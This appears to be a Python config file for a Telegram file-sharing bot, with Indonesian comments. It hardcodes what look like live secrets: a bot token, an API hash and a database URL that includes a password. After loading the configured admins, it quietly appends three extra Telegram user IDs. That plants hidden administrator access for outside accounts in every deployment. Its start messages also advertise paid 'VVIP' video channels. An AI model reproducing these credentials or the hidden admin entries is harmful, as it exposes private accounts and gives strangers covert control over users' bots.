# (©)Codexbotz
# Recife By #Mafia_Tobatz
# Recode by @RYUUSHINNI
# Kalo clone Gak usah hapus 
# gue tandain akun tele nya ngentod


import logging
import os
from logging.handlers import RotatingFileHandler

# Bot token dari @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "5925099299:AAG7lZfFX5fzq3KbnlNcwOxhrDkxAPpODFQ")

# API ID Anda dari my.telegram.org
APP_ID = int(os.environ.get("APP_ID", "16246834"))

# API Hash Anda dari my.telegram.org
API_HASH = os.environ.get("API_HASH", "29b3ffa9245c07f05375b92f38e8f13d")

# ID Channel Database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1001838561094"))

# OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", "1715348447"))

# NAMA OWNER
OWNER = os.environ.get("OWNER", "gkushskap")

# Database
DB_URI = os.environ.get("DATABASE_URL", "postgres://qxburaku:ZV5gKtEhw0RMS_7nqh3qoYgfjFJxeJ_A@batyr.db.elephantsql.com/qxburaku")

# Username CH & Group
CHANNEL = os.environ.get("CHANNEL", "nakama_asl")
GROUP = os.environ.get("GROUP", "virtual_executive")

# ID dari Channel Atau Group Untuk Wajib Subscribenya
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "-1001569500029"))
FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "-1001528080636"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pesan Awalan /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>Hello {first}</b>\n\n<b>VVIP 9 GROUP/CHANNEL DENGAN TOTAL PULUHAN RIBU VIDEO HANYA 50K HUB @PANGGILAJA_M.</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "1715348447").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

# Pesan Saat Memaksa Subscribe
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>Hello {first}\n\nPromo VVIP 9 GROUP/CHANNEL DENGAN TOTAL PULUHAN RIBU VIDEO HANYA 50K HUB @PANGGILAJA_M</b>",
)

# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"

ADMINS.append(5589797950)
ADMINS.append(1245451624)
ADMINS.append(1780709155)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
